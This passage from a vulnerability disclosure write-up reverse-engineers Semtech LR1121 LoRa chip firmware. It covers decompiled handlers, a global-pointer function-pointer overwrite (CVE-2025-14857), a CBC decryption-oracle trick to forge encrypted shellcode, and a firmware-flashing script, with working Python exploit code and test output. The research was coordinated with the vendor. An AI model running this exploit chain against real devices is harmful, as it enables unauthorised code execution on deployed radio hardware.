  v1 = sub_84138(v0);
  sub_932E4(v1);
  while ( 1 )
    __flag(1u);
}
```

First two functions probably just do some init stuff, like initializing memory, handlers, etc, so I immediately look into `sub_932E4`:
```c
void __noreturn sub_932E4()
{
  int v0; // r0
  int v5; // r0
  int v6; // r0
  int v8; // r0
  unsigned int v9; // r0
  int v10; // r0
  int v11; // r0
  int v12; // r0
  int v13; // r0
  int v14; // r0
  int v15; // r0
  int v16; // r13
  int v17; // r0
  unsigned int v18; // r13
  int (__fastcall *v19)(unsigned int); // r1
  int v20; // t1

  MEMORY[0xF01024] |= 0x800u;
  MEMORY[0xF20124] |= 0x1000u;
  MEMORY[0xF1903C] |= 0x8000000u;
  MEMORY[0xF1903C] |= 0x4000000u;
  MEMORY[0xF01018] = 255;
  MEMORY[0xF20118] = 255;
  MEMORY[0xF30018] = 255;
  MEMORY[0xF3001C] = 0;
  MEMORY[0xF16008] |= 0x1Fu;
  v0 = sub_9067C(&off_84000);
  sub_90E5C(v0);
  _R0 = 16;
  __asm { seti    r0 }
  sub_88D4C(54);
  MEMORY[0xF01024] |= 4u;
  v5 = sub_8D0DC(1);
  sub_8A480(v5);
  v6 = sub_89F7C(0);
  sub_9103C(v6);
  if ( MEMORY[0xF0102C] & 1 | MEMORY[0xF00044] & 1 )
  {
    MEMORY[0x12] = 1;
  }
  else if ( MEMORY[0xF0102C] & 2 | MEMORY[0xF00044] & 2 )
  {
    MEMORY[0x12] = 2;
  }
  else if ( MEMORY[0xF0102C] & 4 | MEMORY[0xF00044] & 4 )
  {
    MEMORY[0x12] = 3;
  }
  else if ( MEMORY[0xF0102C] & 8 | MEMORY[0xF00044] & 8 )
  {
    MEMORY[0x12] = 4;
  }
  else if ( MEMORY[0xF0102C] & 0x10 | MEMORY[0xF00044] & 0x10 )
  {
    MEMORY[0x12] = 5;
  }
  else if ( MEMORY[0xF0102C] & 0x20 | MEMORY[0xF00044] & 0x20 )
  {
    MEMORY[0x12] = 6;
  }
  _ZF = (MEMORY[0xF0102C] & 0x30 | MEMORY[0xF00044] & 0x30) == 0;
  if ( MEMORY[0xF0102C] & 0x30 | MEMORY[0xF00044] & 0x30 )
    _ZF = (MEMORY[0xF00034] & 6) == 0;
  if ( _ZF )
  {
    MEMORY[0xF01040] = MEMORY[0xF01040] & 0xFFFFC0C0 | 0x505;
    MEMORY[0xF0103C] = MEMORY[0xF0103C] & 0xFFF0FFFF | 0x40000;
    v10 = sub_90748(0);
    MEMORY[0x28] = 0;
    v11 = sub_917EC(v10);
    v12 = sub_8D114(v11);
    v13 = sub_884E8(v12);
    sub_88884(v13);
    v14 = sub_85AEC(127);
    sub_86A58(v14);
    MEMORY[0xF17018] |= 0x10u;
    sub_882B4(1);
    v9 = MEMORY[0xF17018] & 0xFFFFFFEF;
    MEMORY[0xF17018] &= ~0x10u;
  }
  else
  {
    v8 = sub_91918();
    sub_8D2B8(v8);
    sub_91694(1);
    if ( (MEMORY[0xF0403C] & 1) != 0 )
      v9 = sub_86504(1);
    else
      v9 = sub_91694(0);
  }
  sub_91C7C(v9);
  v15 = 15802368;
  MEMORY[0xF12000] |= 0x400u;
  while ( 1 )
  {
    sub_91D48(v15);
    MEMORY[0xF01024] &= ~0x800u;
    v16 = sub_91D90(1);
    v15 = MEMORY[0xF01024] | 0x800;
    MEMORY[0xF01024] |= 0x800u;
    if ( (v16 & 1) != 0 )
    {
      v17 = nullsub_1();
      v15 = sub_89DE4(v17);
      v16 &= ~1u;
    }
    v18 = v16 & 0xFFFFFFAF;
    v19 = *(int (__fastcall **)(unsigned int))(v20 + 20);
    if ( v18 )
    {
      if ( v19 )
        v15 = v19(v18);
    }
  }
}
```

We see that some initialization occurs first, then the execution flow goes to `while ( 1 )`, and, as far as I can tell, main command handling should happen there. Let's look into `sub_89DE4`, which runs in an `if` block in `while ( 1 )`:
```c
int sub_89DE4()
{
  int v0; // r0
  int v1; // t1
  unsigned int v2; // r1
  int v3; // t1
  unsigned int v5; // r13
  int v6; // r0
  int v7; // t1
  unsigned int v13; // r0
  int v15; // r1
  int v16; // r2
  char v17; // r0
  int v18; // r0
  int result; // r0

  v0 = *(_DWORD *)(v1 + 28);
  if ( v0 )
  {
    byte_800508[0] = (v0 & 1) != 0;
LABEL_11:
    sub_8E65C(0x400000);
    v13 = byte_800508[0];
LABEL_12:
    if ( v13 != 4 )
      goto LABEL_14;
    goto LABEL_13;
  }
  v2 = *(_DWORD *)(v3 + 32);
  _R14 = byte_8007D0[0];
  if ( v2 < 2 )
  {
    __asm { seteq   r0, r14, 0 }
    v13 = _R0 + 1;
    goto LABEL_10;
  }
  v5 = byte_8007D0[1];
  if ( byte_8007D0[0] )
  {
    if ( HIBYTE(word_80048C) )
    {
      if ( v2 < 3 || (v6 = sub_90FF4(), MEMORY[0x40] = *(_DWORD *)(v7 + 32) - 1, v6) )
      {
        byte_800508[0] = 4;
LABEL_13:
        v13 = sub_8E65C(0x4000000);
        goto LABEL_14;
      }
    }
  }
  if ( _R14 == 5 )
  {
    v13 = sub_86A40(v5);
    goto LABEL_10;
  }
  if ( _R14 == 1 )
  {
    v13 = sub_91900(v5);
    goto LABEL_10;
  }
  v13 = v5;
  if ( _R14 == 2 )
  {
    v13 = sub_8D0FC(v5);
LABEL_10:
    byte_800508[0] = v13;
    if ( v13 > 2 )
      goto LABEL_12;
    goto LABEL_11;
  }
  if ( _R14 )
  {
    byte_800508[0] = 1;
    goto LABEL_11;
  }
  byte_800508[0] = 2;
LABEL_14:
  sub_91C7C(v13);
  if ( byte_800508[0] == 3 )
  {
    _R0 = sub_8981C();
    __asm { setne   r0, r0, 0 }
    byte_800510 = _R0;
    sub_91390(1, (2 * byte_800508[0]) | _R0, 0);
    if ( dword_80051C && dword_800518 )
    {
      sub_911AC(unk_80050C, dword_800514);
    }
    else
    {
      v15 = dword_800514;
      v16 = unk_80050C;
      if ( HIBYTE(word_80048C) )
      {
        v17 = sub_90F8C((unsigned __int8)byte_800510 | (2 * byte_800508[0]), dword_800514);
        v15 = dword_800514;
        v16 = unk_80050C + 1;
        *(_BYTE *)(unk_80050C + dword_800514) = v17;
        unk_80050C = v16;
      }
      sub_912D0(v16, v15);
    }
  }
  MEMORY[0x38] = 0;
  v18 = sub_91388();
  sub_91D48(v18);
  sub_86554(1);
  result = 15802368;
  MEMORY[0xF12000] |= 0x400u;
  return result;
}
```

Now, we can clearly see the optimized away switch case of handlers:
- 1 (system functions) → `sub_91900`
- 2 (radio functions) → `sub_8D0FC`
- 5 (crypto functions) → `sub_86A40`

What's inside these functions?
```c
int __fastcall CallSystemFunctions(unsigned int a1)
{
  bool v2; // cc
  int result; // r0

  v2 = a1 <= 0x30;
  result = 1;
  if ( v2 )
    return (*(&off_93C80 + a1))();
  return result;
}
```

And here it goes: system function table!
```asm
ROM:00093C80 system_functions:.long sub_89CC8        # DATA XREF: sub_8414C+4↑o
ROM:00093C80                                         # CallSystemFunctions+C↑r
ROM:00093C84                 .long sub_89DAC
ROM:00093C88                 .long sub_92178
ROM:00093C8C                 .long sub_920B4
ROM:00093C90                 .long sub_8D7DC
ROM:00093C94                 .long sub_92308
ROM:00093C98                 .long sub_8DBC8
ROM:00093C9C                 .long sub_92240
ROM:00093CA0                 .long sub_8D9FC
ROM:00093CA4                 .long sub_9217C
ROM:00093CA8                 .long sub_8D898
ROM:00093CAC                 .long sub_86530
ROM:00093CB0                 .long sub_92490
ROM:00093CB4                 .long sub_897F0
ROM:00093CB8                 .long sub_864A8
ROM:00093CBC                 .long sub_85E80
ROM:00093CC0                 .long sub_8F88C
ROM:00093CC4                 .long sub_85834
ROM:00093CC8                 .long sub_8E2F0
ROM:00093CCC                 .long sub_8E338
ROM:00093CD0                 .long sub_864E4
ROM:00093CD4                 .long sub_89828
ROM:00093CD8                 .long sub_8656C
ROM:00093CDC                 .long sub_903F8
ROM:00093CE0                 .long sub_8DDA0
ROM:00093CE4                 .long sub_89D28
ROM:00093CE8                 .long sub_89CD0
ROM:00093CEC                 .long sub_902D0
ROM:00093CF0                 .long sub_90300
ROM:00093CF4                 .long sub_8E580
ROM:00093CF8                 .long sub_89930
ROM:00093CFC                 .long sub_88DA0
ROM:00093D00                 .long sub_89C30
ROM:00093D04                 .long sub_88EC0
ROM:00093D08                 .long sub_921E0
ROM:00093D0C                 .long sub_8D954
ROM:00093D10                 .long sub_8CF84
ROM:00093D14                 .long sub_8978C
ROM:00093D18                 .long sub_89848
ROM:00093D1C                 .long sub_8DB10
ROM:00093D20                 .long sub_88E68
ROM:00093D24                 .long sub_8DD5C
ROM:00093D28                 .long sub_88D8C
ROM:00093D2C                 .long sub_91990
ROM:00093D30                 .long sub_9197C
ROM:00093D34                 .long sub_919BC
ROM:00093D38                 .long sub_91938
ROM:00093D3C                 .long sub_85EA4
ROM:00093D40                 .long sub_89AF0
```

Unfortunately, initial analysis did not succeed in finding any code execution-like function :(

## I want to run what I want: CVE-2025-14857

But, I still want to do some kind of code execution!

Looking at the main processing loop, we can see an interesting call:
```c
void __noreturn sub_932E4()
{
  int v0; // r0
  int v5; // r0
  int v6; // r0
  int v8; // r0
  unsigned int v9; // r0
  int v10; // r0
  int v11; // r0
  int v12; // r0
  int v13; // r0
  int v14; // r0
  int v15; // r0
  int v16; // r13
  int v17; // r0
  unsigned int v18; // r13
  int (__fastcall *v19)(unsigned int); // r1
  int v20; // t1

  MEMORY[0xF01024] |= 0x800u;
  // ...
  MEMORY[0xF12000] |= 0x400u;
  while ( 1 )
  {
    v16 = sub_91D90(1);
    // ...
    v18 = v16 & 0xFFFFFFAF;
    v19 = *(int (__fastcall **)(unsigned int))(v20 + 20);
    if ( v18 ) // if (some flags set)
    {
      if ( v19 ) // and if there is something at some pointer
        v15 = v19(v18); // call this function pointer!
    }
  }
}
```

Where is this function pointer located? Where are these flags located?

Let's start with flags:
```c
v16 = sub_91D90(1);

int __fastcall sub_91D90(char a1)
{
  int v6; // t1
  int v7; // r0
  char v8; // r0
  int result; // r0
  int v11; // t1

  __asm { clri    0 }
  v7 = a1 & 7;
  if ( *(v6 + 36) )
  {
    __asm { seti    0 }
  }
  else
  {
    MEMORY[0xF01024] = (v7 << 16) | MEMORY[0xF01024] & 0xFFF8FFFF;
    v8 = __lr(0x22u);
    if ( (v8 & 1) != 0 )
      __asm { wevt    0x54 # 'T' }
    else
      __asm { wevt    0x74 # 't' }
    MEMORY[0xF01024] &= 0xFFF8FFFF;
  }
  __asm { clri    0 }
  result = *(v11 + 36); // *(t1 + 36)
  MEMORY[0x48] = 0;
  __asm { seti    0 }
  return result;
}
```

What is `t1`? IDA helps with it in the disassembler:
```asm
ROM:00091DE0 loc_91DE0:                              # CODE XREF: sub_91D90+10↑j
ROM:00091DE0                 clri    0
ROM:00091DE4                 ld_s    r0, [gp,0x24]
ROM:00091DE6                 st      0, [gp,0x24]
ROM:00091DEA                 seti    0
ROM:00091DEE                 j_s     [blink]
ROM:00091DEE # End of function sub_91D90
```

GP - Global Pointer! It is set on startup in the reset handler:
```asm
ROM:000840F8 __RESET:                                # DATA XREF: ROM:off_84000↑o
ROM:000840F8                 mov_s   sp, unk_805C00
ROM:000840FE                 mov_s   gp, unk_800498
ROM:00084104                 mov_s   fp, 0
```

So, GP is `0x800498`, flags are in `0x800498 + 0x24`, and the function pointer is in `0x800498 + 0x14`!

Unfortunately, `WriteRegMem32` only allows writes from `0x806000` to `0x810000`, and these addresses are far beyond this region:
```c
unsigned int SystemWriteRegMem32()
{
  int _R2; // r2
  __int16 *v1; // r6
  int _R3; // r3
  int v3; // r1
  int v4; // t1
  _DWORD *_R2; // r2
  unsigned int result; // r0
  int _R12; // r12
  unsigned int _R11; // r11
  int _R3; // r3
  bool _ZF; // zf
  int v15; // r12
  int _R0; // r0
  int v17; // t1
  int _R1; // r1
  int _R0; // r0
  int v21; // t1
  unsigned int v22; // r3
  unsigned int v23; // r0
  bool v24; // dc
  unsigned int v25; // r3
  unsigned int v26; // r8
  int v27; // r12
  unsigned int v28; // r3
  int _R1; // r1
  int v30; // t1
  int _R3; // r3
  int _R1; // r1
  int v34; // t1

  v1 = &word_8007D6;
  _R2 = word_8007D2;
  _R3 = word_8007D4;
  v3 = *(v4 + 32);
  __asm
  {
    vpack2hl r2, r3, r2
    swape   r2, r2
  }
  result = 1;
  if ( (((v3 + 2) | _R2) & 3) == 0 )
  {
    __asm { bmskn   r12, r2, 0xB }
    if ( _R12 != 0xF0F000 )
    {
      _R11 = _R2 + v3 - 7;
      __asm { bmskn   r3, r11, 0xB }
      if ( _R3 != 0xF0F000 && (_R2 > 0xF0F000 || _R11 < 0xF10000) )
      {
        _ZF = _R12 == 0xF17000;
        if ( _R12 != 0xF17000 )
          _ZF = _R3 == 0xF17000;
        if ( !_ZF && (_R2 > 0xF17000 || _R11 <= 0xF17FFF) )
        {
          if ( _R2 < 0xF00000 )
          {
            if ( _R2 >= dword_806000 && _R11 <= &unk_80FFFF ) // here are the limits - i.e. >= 0x806000 and <= 0x80FFFF
            {
              v22 = (_R2 - 0x200000) >> 13;
              v23 = __lr(0x80000008);
              v24 = (v23 & (7 << ((3 * v22) & 0x1F))) == 0;
              result = 0;
              if ( v24 )
              {
                v25 = v22 + 1;
                v26 = __lr(0x80000008);
                v27 = 7 << ((3 * v25) & 0x1F);
                v28 = v25 << 13;
                if ( (v26 & v27) == 0 || _R11 < &byte_800000[v28] )
                {
                  if ( (v3 - 6) >= 4 )
                  {
                    do
                    {
                      v30 = *v1;
                      v1 += 2;
                      _R1 = v30;
                      _R3 = *(v1 - 1);
                      ++result;
                      __asm
                      {
                        vpack2hl r1, r3, r1
                        swape   r1, r1
                      }
                      *_R2++ = _R1;
                    }
                    while ( result < (*(v34 + 32) - 6) >> 2 );
                  }
                  return 2;
                }
              }
            }
          }
          else if ( _R11 <= 0xF30FFF )
          {
            byte_800520[0] = byte_800520[0] & 0xE3 | 8;
            byte_800520[0] = byte_800520[0] & 0xFC | 1;
            if ( (v3 - 6) < 4 )
            {
LABEL_17:
              byte_800520[0] &= 0xFCu;
            }
            else
            {
              v15 = 0;
              while ( 1 )
              {
                v17 = *v1;
                v1 += 2;
                _R0 = v17;
                _R1 = *(v1 - 1);
                __asm
                {
                  vpack2hl r0, r1, r0
                  swape   r0, r0
                }
                *_R2++ = _R0;
                __asm { sync }
                if ( (byte_800520[0] & 3) == 0 )
                  break;
                if ( ++v15 >= (*(v21 + 32) - 6) >> 2 )
                  goto LABEL_17;
              }
            }
            return (byte_800520[0] >> 2) & 7;
          }
        }
      }
    }
  }
  return result;
}
```

But Semtech developers kindly provided another write primitive: `WriteRegMemMask32`.
This function allows 32-bit writes to any memory location, which is exactly what is needed.

And as far as `WriteRegMemMask32` allows to write to these locations, I can quickly do some simple testing:
- Set flags to `0xFFFFFFFE` and function pointer to somewhere with `ret` in firmware, and the chip must run as it is
  - I can use `0x84144` as an example address:
    ```asm
    ROM:00084144                 j_s     [blink]
    ```
- Set flags to `0xFFFFFFFE` and function pointer to somewhere with an infinite loop in firmware, and the chip must hang and reset
  - I can use `0x84120` as an example address (infinite loop from reset handler):
    ```asm
    ROM:00084120 loc_84120:                              # CODE XREF: __RESET+2E↓j
    ROM:00084120                 flag    1
    ROM:00084124                 nop_s
    ROM:00084126                 b_s     loc_84120
    ```

Testing it with this script:
```python
# article_7_code_execution.py

address_to_jump_to = int(sys.argv[1], 16)

def write_reg_mem_mask_32(client, address, mask, data):
  print(client.send_command(0x010C, u32_to_array(address) + u32_to_array(mask) + u32_to_array(data), 0))

def redirect_execution(client, jump_address):
  print('redirecting...')
  gp = 0x800498
  write_reg_mem_mask_32(client, gp + 0x14, 0xFFFFFFFF, jump_address)
  write_reg_mem_mask_32(client, gp + 0x24, 0xFFFFFFFF, 0xFFFFFFFE)
  print(client.send_command(0x0101, [], 4)) # get version

redirect_execution(client, address_to_jump_to)
```

Testing:
```
(toolkit) root@lr11xx-test:~/toolkit# python article_7_code_execution.py 0x84144
using configuration 'radiomaster'
redirecting...
(129, 0, 2, [])
(129, 0, 2, [])
(129, 0, 3, [34, 3, 1, 3])
(toolkit) root@lr11xx-test:~/toolkit# python article_7_code_execution.py 0x84120
using configuration 'radiomaster'
redirecting...
(129, 0, 2, [])
(129, 0, 2, [])
(129, 1, 5, [])
(toolkit) root@lr11xx-test:~/toolkit#
```

PROFIT, I've achieved code execution redirection. 

This was the second vulnerability I discovered, also medium: **CVE-2025-14857**

Unfortunately, after some tests, trying to execute code from RAM puts the CPU into some kind of trap (chip just hangs), primarily because (as I think) of the fact that ARC CPUs allow separate instruction and data address spaces [<sup>\[4\]</sup>](#references). 

![ARC EM manual separate instruction and data address spaces](/images/2026-04-06-lora-under-attack/image-12.png)

So now I must somehow put my code into the executable part of the flash!

## FLASH!

I know that flash in the address space is at least from `0x84000` to `0x9441F`, based on the firmware base and size. But I think flash is larger than the firmware, just because there's modem firmware that is 4 times as big as this. 
From the firmware, we can see a footer (possibly with a signature):

```
{% raw %}000103c0: 1ce4 0800 c8f7 0800 20f5 0800 acf5 0800  ........ .......
000103d0: c8f6 0800 20f5 0800 acf5 0800 20f5 0800  .... ....... ...
000103e0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000103f0: 5907 d872 f6f6 4d27 0ce3 6432 7f1a 5e41  Y..r..M'..d2..^A
00010400: b08e b65e 2bed 1956 b908 0e7b 5887 fb50  ...^+..V...{X..P
00010410: 865c b1d8 b462 b53f 0808 0808 0808 0808  .\...b.?........{% endraw %}
```

I can put my code after it, and because it is outside the firmware, it will not be checked; however, it will still be in the flash, where we can jump!

However, we currently only have a decryption oracle. How can I use it to encrypt firmware?
The way to do this is really simple: remember, they use CBC for decryption.
Glancing once again at the CBC cipher block mode operation diagram, I can come up with a plan:

![CBC encryption scheme](/images/2026-04-06-lora-under-attack/image-6.png)

If we begin unrolling encryption backward, you can see that the last block is just the decrypted ciphertext XORed with the previous block. I definitely have control over the previous block, so why don't I just set it to some value that, when XORed with the current decrypted block, gives valid instructions? Then I can do the same for all the other blocks, up to the first, which I can't control. This gives me 256 - 16 = 240 bytes of any data that I can put in the flash! I think that is more than enough for PoC.

More about this can be read in a great paper [<sup>\[5\]</sup>](#references).

First, I must write my own example shellcode for this. For PoC, it can contain just 2 kinds of instructions: one `ret` and one infinite loop.
Shellcode is the following:
```asm
.section .shellcode

j [blink] ; here is our ret
nop
nop
loop:
  b_s loop ; here is our while true loop
```

Because this chip uses ARC, you can simply use `arc-linux-gnu-as`, `arc-linux-gnu-ld`, and `arc-linux-gnu-objcopy` for compiling this shellcode:

Linker script:
```
MEMORY
{
  # we start from 0x94500, as this is the start of the next encrypted block
  FLASH (rx) : ORIGIN = 0x94500, LENGTH = 0x100
}

SECTIONS
{
  .text :
  {
    . = . + 0x10;
    *(.shellcode)
    . = ALIGN(0x100);
  } > FLASH
}
```

Building:
```
(toolkit) root@lr11xx-test:~/toolkit/shellcode# arc-linux-gnu-as shellcode.s -o shellcode.o
(toolkit) root@lr11xx-test:~/toolkit/shellcode# arc-linux-gnu-ld -o shellcode shellcode.o -T linker.ld 
(toolkit) root@lr11xx-test:~/toolkit/shellcode# arc-linux-gnu-objcopy -O binary shellcode shellcode.bin
(toolkit) root@lr11xx-test:~/toolkit/shellcode# xxd shellcode.bin
00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000010: 2020 c007 4a26 0070 4a26 0070 00f0 0000    ..J&.pJ&.p....
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
(toolkit) root@lr11xx-test:~/toolkit/shellcode#
```

Now I need to "encrypt" this block:
```python
# article_8_encrypt_shellcode.py

ORIGINAL_FIRMWARE = "lr1121_transceiver_0103.bin"

with open(ORIGINAL_FIRMWARE, "rb") as f:
  original_firmware = bytearray(f.read())

with open("shellcode/shellcode.bin", "rb") as f:
  shellcode = list(f.read())

if len(shellcode) % 256 != 0:
  raise ValueError('wrong shellcode size')

def ensure_ok(response):
  if response[2] != 0:
    raise ValueError('wut? ' + str(response))

def decrypt_firmware_block(client, block, offset=0):
  if len(block) != 0x100:
    raise ValueError("block must be of size 256")
  result = bytearray()
  first_block = block[0x0:0x80]
  vector = [0] * 16
  vector[0] = offset % 256
  vector[1] = offset // 256 % 256
  vector[2] = offset // 65536 % 256
  vector[3] = offset // 16777216 % 256
  first_request = bytes(vector) + first_block
  ensure_ok(client.send_command(0x050f, [0, 0, 0, 0] + list(first_request), 3))
  first_result = read_memory_or_error(client, 0x805ae0, 0x100)[0x14:0x14 + 0x80]
  result += first_result[0:len(first_block)]

  second_block = block[0x80:0x100]
  second_request = block[0x70:0x80] + second_block
  ensure_ok(client.send_command(0x050f, [0, 0, 0, 0] + list(second_request), 3))
  second_result = read_memory_or_error(client, 0x805ae0, 0x100)[0x14:0x14 + 0x80]
  result += second_result[0:len(second_block)]
  return result

def decrypt_aes_block(client, block):
  request = bytes([0] * 16) + block
  ensure_ok(client.send_command(0x050f, [0, 0, 0, 0] + list(request), 3))
  return read_memory_or_error(client, 0x805ae0, 0x100)[0x14:0x14 + 0x10]

# some endianness shenanigans
def xor(a, b):
  if len(a) != len(b):
    raise ValueError()
  result = []
  for i in range(len(a)):
    result.append(a[i] ^ b[i])
  return bytearray(result)

def xor_with_swap(a, b):
  if len(a) != len(b):
    raise ValueError()
  result = []
  for i in range(len(a)):
    result.append(b[i] ^ a[i // 4 * 4 + (3 - i % 4)])
  return bytearray(result)

def swap_bytes_for_cbc(b):
  result = []
  for i in range(len(b)):
    result.append(b[i // 4 * 4 + (3 - i % 4)])
  return result

# pad original firmware
result_firmware = list(original_firmware)
while len(result_firmware) % 256 != 0:
  result_firmware.append(0xaa)

result_shellcode = [0] * len(shellcode)

for block_offset in range(0, len(shellcode), 256):
  block = shellcode[block_offset:block_offset + 256]
  previous_ciphertext = [0xaa] * 16
  for block_index in range(256 - 16, 0, -16):
    result_shellcode[block_offset + block_index:block_offset + block_index + 16] = previous_ciphertext
    aes_plaintext = block[block_index:block_index + 16]
    result_plaintext = decrypt_aes_block(client, bytes(previous_ciphertext))
    previous_ciphertext = xor_with_swap(result_plaintext, swap_bytes_for_cbc(aes_plaintext))
    print(f'doing magic to {hex(block_offset + block_index)}')
  result_shellcode[block_offset:block_offset + 16] = previous_ciphertext

result_firmware += result_shellcode
with open("lr1121_magic_firmware.bin", "wb") as f:
  f.write(bytes(result_firmware))

print(f'your code begins at: {hex((len(original_firmware) + 255) // 256 * 256 + 0x84000)}')
```

Running this produces this output:
```
(toolkit) root@lr11xx-test:~/toolkit# python article_8_encrypt_shellcode.py
using configuration 'radiomaster'
doing magic to 0xf0
doing magic to 0xe0
doing magic to 0xd0
doing magic to 0xc0
doing magic to 0xb0
doing magic to 0xa0
doing magic to 0x90
doing magic to 0x80
doing magic to 0x70
doing magic to 0x60
doing magic to 0x50
doing magic to 0x40
doing magic to 0x30
doing magic to 0x20
doing magic to 0x10
your code begins at: 0x94500
(toolkit) root@lr11xx-test:~/toolkit#
```

Now you just need to update the firmware to this file:
```python
# article_9_update_firmware.py
import time

with open(sys.argv[1], "rb") as f:
  firmware = f.read()

print(f'firmware size: {len(firmware)}')

# go to bootloader
print(client.send_command(0x0118, [3], 0))
# wait for it
time.sleep(0.1)
# check bootloader version
print(client.send_command(0x0101, [], 4))

# bootloader commands
def erase_flash(client):
  print(client.send_command(0x8000, [], 0))

def write_chunk(client, offset, chunk):
  print(client.send_command(0x8003, [offset // 16777216 % 256, offset // 65536 % 256, offset // 256 % 256, offset % 256] + list(chunk), 0))

def reset(client):
  print(client.send_command(0x8005, [0], 0))

erase_flash(client)

for chunk_start in range(0, len(firmware), 0x100):
  offset = chunk_start
  chunk = firmware[chunk_start:chunk_start + 256]
  write_chunk(client, offset, chunk)
  print(f"written chunk {offset} {len(chunk)}")

reset(client)

# check version after restart
print(client.send_command(0x0101, [], 4))
```

And updating succeeds:
```
(toolkit) root@lr11xx-test:~/toolkit# python article_9_update_firmware.py lr1121_magic_firmware.bin
using configuration 'radiomaster'
firmware size: 67072
(129, 0, 2, [])
(129, 0, 3, [34, 223, 33, 0])
(129, 0, 2, [])
(129, 0, 2, [])
written chunk 0 256
(129, 0, 2, [])
written chunk 256 256
(129, 0, 2, [])
written chunk 512 256
(129, 0, 2, [])
...
written chunk 66560 256
(129, 0, 2, [])
written chunk 66816 256
(129, 0, 2, [])
(129, 0, 3, [34, 3, 1, 3])
(toolkit) root@lr11xx-test:~/toolkit#
```

## Final words before the shot

Now let's test:
- Shellcode's `ret` is at address `0x94510`
- Shellcode's infinite loop is at address `0x9451C`

Testing:
```
(toolkit) root@lr11xx-test:~/toolkit# python article_7_code_execution.py 0x94510
using configuration 'radiomaster'
redirecting...
(129, 0, 2, [])
(129, 0, 2, [])
(129, 0, 3, [34, 3, 1, 3])
(toolkit) root@lr11xx-test:~/toolkit# python article_7_code_execution.py 0x9451C
using configuration 'radiomaster'
redirecting...
(129, 0, 2, [])
(129, 0, 2, [])
(129, 1, 5, [])
(toolkit) root@lr11xx-test:~/toolkit#
```

Done. I've finally achieved my custom code execution!

Unfortunately, this itself does not constitute a vulnerability; rather, it is the result of combining two!

## Timeline

- ~ 06.2025 - initial reconnaissance of possible vulnerable scenarios
- 12.10.2025 - first glance at physical LR1121 chip
- 17.10.2025 - vulnerability found
- 18.10.2025 - first email to Semtech security department
- 21.10.2025 - first reply from Semtech regarding this issue and written report about it to Semtech
- 29.10.2025 - confirmation of vulnerability from Semtech
- 18.02.2026 - planned vulnerability disclosure from Semtech in April
- 07.04.2026 - disclosure of these vulnerabilities from Semtech and release of this article

As a bystander, communication with Semtech was really warm, nice, and easy. I'd be happy to report more vulnerabilities (if found) to them, and can recommend their security team as really good (they do really great stuff!).

As for everyone else, you can contact me about this article or the stuff you are interested in! I'm open to talking about this or anything else (including jobs!)

## P.S.

While this article does not cover everything I did, I've left some stuff in the repo, including scripts for disabling firmware verification, changing flash contents from code, dumping encrypted keys from the cryptoaccelerator to a readable part of flash, and more. By the way, you can now dump their first and secondary bootloaders, and craft custom code to bypass signatures because of magic bytes used to disable verification of the signature of the secondary bootloader!

Also, Semtech released third vulnerability - **CVE-2025-14859** (7/10, high). This vulnerability allows the signing of custom firmware because AES-CBC preimages can be easily calculated, enabling the crafting of custom firmware. I found it **independently** as well, but later, and Semtech found it earlier (after disclousure of first two, but before me).

With these vulnerabilities, you can now create a custom firmware for the chip - put a major part of Meshtastic on the LoRa chip, or create your own custom protocol on top of LoRa; the possibilities are truly endless!

As a result of reusing the same code, all LR11xx chips are vulnerable, but the GP offset and offsets from GP differ from chip to chip. However, keys for firmware decryption are different on different chips (LR1110, LR1120, and LR1121 all have different keys)

Also, Semtech recently released LR2021, and while it does not include flash, dumping the ROM firmware and executing custom code is as simple as sending SPI commands. Try it out!

## References

1. [Main article repo](https://github.com/radioegor146/lr-security-research)
2. [LR1121 User Manual](https://semtech.my.salesforce.com/sfc/p/E0000000JelG/a/RQ000005h0I1/uRUCgjGWaHW2B2wFchdm_w96ucy3g12TruwkrJkeBEE)
3. [ARC (processor)](https://en.wikipedia.org/wiki/ARC_(processor))
4. [Programmer's Reference Manual for ARC EM Processors (Public Edition)](https://www.synopsys.com/dw/doc.php/iip/DWC_ARC_EM/ARC_EM_PublicProgrammersReference.pdf)
5. [Practical Padding Oracle Attacks (Juliano Rizzo, Thai Duong), May 25th, 2010](https://www.usenix.org/legacy/event/woot10/tech/full_papers/Rizzo.pdf)
6. [Block cipher mode of operation](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation)
7. [radio_firmware_images GitHub](https://github.com/Lora-net/radio_firmware_images)